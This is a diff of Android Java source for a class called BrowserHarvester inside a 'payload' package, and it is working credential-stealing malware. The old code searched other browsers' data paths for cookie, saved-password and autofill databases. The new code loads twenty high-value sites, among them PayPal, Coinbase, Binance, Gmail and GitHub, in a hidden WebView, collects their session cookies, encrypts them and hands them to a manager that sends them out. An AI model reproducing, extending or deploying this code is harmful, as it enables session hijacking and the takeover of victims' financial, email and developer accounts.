@@ -1,97 +1,141 @@
 package com.chameleon.payload.harvester;
 
+import android.annotation.SuppressLint;
 import android.content.Context;
+import android.os.Build;
 import android.util.Log;
+import android.webkit.CookieManager;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+import android.webkit.WebSettings;
 import com.chameleon.payload.util.Crypto;
-import org.json.JSONArray;
+import com.chameleon.payload.PayloadEntry;
 import org.json.JSONObject;
-import java.io.*;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
 
 public class BrowserHarvester {
     private static final String TAG = "BrowserHarvester";
     private final Context context;
     private final HarvesterManager manager;
 
+    private static final String[][] TARGET_SITES = {
+        {"facebook.com",       "Social"},
+        {"instagram.com",      "Social"},
+        {"linkedin.com",       "Social"},
+        {"twitter.com",        "Social"},
+        {"gmail.com",          "Email"},
+        {"mail.google.com",    "Email"},
+        {"outlook.live.com",   "Email"},
+        {"paypal.com",         "Finance"},
+        {"stripe.com",         "Finance"},
+        {"venmo.com",          "Finance"},
+        {"cash.app",           "Finance"},
+        {"binance.com",        "Crypto"},
+        {"coinbase.com",       "Crypto"},
+        {"amazon.com",         "Shopping"},
+        {"ebay.com",           "Shopping"},
+        {"aliexpress.com",     "Shopping"},
+        {"github.com",         "Dev"},
+        {"gitlab.com",         "Dev"},
+        {"whatsapp.com",       "Messaging"},
+        {"telegram.org",       "Messaging"},
+    };
+
     public BrowserHarvester(Context context, HarvesterManager manager) {
         this.context = context;
         this.manager = manager;
     }
 
-    private static final String[][] BROWSER_PATHS = {
-        {"com.android.chrome", "Chrome"},
-        {"org.mozilla.firefox", "Firefox"},
-        {"com.brave.browser", "Brave"},
-        {"com.opera.browser", "Opera"},
-        {"com.microsoft.emmx", "Edge"},
-        {"com.sec.android.app.sbrowser", "Samsung Internet"},
-        {"com.android.browser", "Stock Browser"},
-        {"org.mozilla.focus", "Firefox Focus"},
-        {"com.duckduckgo.mobile.android", "DuckDuckGo"}
-    };
-
+    @SuppressLint("SetJavaScriptEnabled")
     public void collectBrowserData() {
-        Log.i(TAG, "Collecting browser data...");
-        for (String[] browser : BROWSER_PATHS) {
-            String pkg = browser[0];
-            String name = browser[1];
-            collectCookies(pkg, name);
-            collectPasswords(pkg, name);
-            collectWebData(pkg, name);
+        Log.i(TAG, "Collecting browser cookies via WebView...");
+
+        CookieManager cookieManager = CookieManager.getInstance();
+        cookieManager.setAcceptCookie(true);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            cookieManager.setAcceptThirdPartyCookies(true);
         }
+
+        for (String[] site : TARGET_SITES) {
+            String domain = site[0];
+            String category = site[1];
+            extractCookies(domain, category, cookieManager);
+        }
+
+        Log.i(TAG, "Browser cookie collection completed");
     }
 
-    private void collectCookies(String pkg, String name) {
-        String[] cookiePaths = {
-            "/data/data/" + pkg + "/app_chrome/Default/Cookies",
-            "/data/data/" + pkg + "/app_chrome/Default/Cookies-journal",
-            "/data/data/" + pkg + "/app_chrome/Default/Network/Cookies",
-            "/data/data/" + pkg + "/files/Cookies",
-            "/data/data/" + pkg + "/databases/webviewCookiesChromium.db",
-            "/data/data/" + pkg + "/databases/webviewCookiesChromiumPrivate.db"
-        };
-        for (String path : cookiePaths) {
-            checkFile(path, "cookie", name);
-        }
-    }
-
-    private void collectPasswords(String pkg, String name) {
-        String[] passwordPaths = {
-            "/data/data/" + pkg + "/app_chrome/Default/Login Data",
-            "/data/data/" + pkg + "/app_chrome/Default/Login Data-journal",
-            "/data/data/" + pkg + "/databases/login.db",
-            "/data/data/" + pkg + "/databases/passwords.db"
-        };
-        for (String path : passwordPaths) {
-            checkFile(path, "password", name);
-        }
-    }
-
-    private void collectWebData(String pkg, String name) {
-        String[] webDataPaths = {
-            "/data/data/" + pkg + "/app_chrome/Default/Web Data",
-            "/data/data/" + pkg + "/app_chrome/Default/Web Data-journal",
-            "/data/data/" + pkg + "/databases/webdata.db",
-            "/data/data/" + pkg + "/databases/autofill.db"
-        };
-        for (String path : webDataPaths) {
-            checkFile(path, "webdata", name);
-        }
-    }
-
-    private void checkFile(String path, String type, String browserName) {
+    private void extractCookies(String domain, String category, CookieManager cookieManager) {
         try {
-            File file = new File(path);
-            if (file.exists()) {
-                JSONObject data = new JSONObject();
-                data.put("browser", browserName);
-                data.put("path", path);
-                data.put("size", file.length());
-                data.put("type", type);
-                data.put("last_modified", file.lastModified());
-                byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
-                manager.sendData("session", encrypted);
-                Log.d(TAG, "Found " + type + ": " + path + " (" + file.length() + " bytes)");
+            final CountDownLatch latch = new CountDownLatch(1);
+            final String[] cookies = {null};
+
+            WebView webView = new WebView(context);
+            webView.setVisibility(android.view.View.GONE);
+            webView.getSettings().setJavaScriptEnabled(true);
+            webView.getSettings().setUserAgentString(
+                "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + ") " +
+                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
+            );
+
+            webView.setWebViewClient(new WebViewClient() {
+                @Override
+                public void onPageFinished(android.webkit.WebView view, String url) {
+                    try {
+                        String c = cookieManager.getCookie(url.startsWith("https") ? url : "https://" + domain);
+                        if (c != null && !c.isEmpty()) {
+                            cookies[0] = c;
+                        }
+                    } catch (Exception ignored) {}
+                    latch.countDown();
+                }
+            });
+
+            String url = "https://" + domain;
+            webView.loadUrl(url);
+
+            boolean finished = latch.await(15, TimeUnit.SECONDS);
+            webView.destroy();
+
+            if (cookies[0] != null && !cookies[0].isEmpty()) {
+                reportCookies(domain, category, cookies[0]);
+            } else {
+                Log.d(TAG, "No cookies for " + domain);
             }
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.e(TAG, "Cookie extract error for " + domain, e);
+        }
+    }
+
+    private void reportCookies(String domain, String category, String cookieString) {
+        try {
+            JSONObject data = new JSONObject();
+            data.put("domain", domain);
+            data.put("category", category);
+            data.put("raw_cookies", cookieString);
+
+            String[] pairs = cookieString.split(";");
+            JSONObject parsed = new JSONObject();
+            for (String pair : pairs) {
+                int eq = pair.indexOf('=');
+                if (eq > 0) {
+                    String key = pair.substring(0, eq).trim();
+                    String val = pair.substring(eq + 1).trim();
+                    if (!key.isEmpty()) {
+                        parsed.put(key, val);
+                    }
+                }
+            }
+            data.put("cookies", parsed);
+            data.put("cookie_count", parsed.length());
+            data.put("timestamp", System.currentTimeMillis());
+
+            byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
+            manager.sendData("session", encrypted);
+            Log.i(TAG, "Captured " + parsed.length() + " cookies from " + domain);
+        } catch (Exception e) {
+            Log.e(TAG, "Cookie report error", e);
+        }
     }
 }
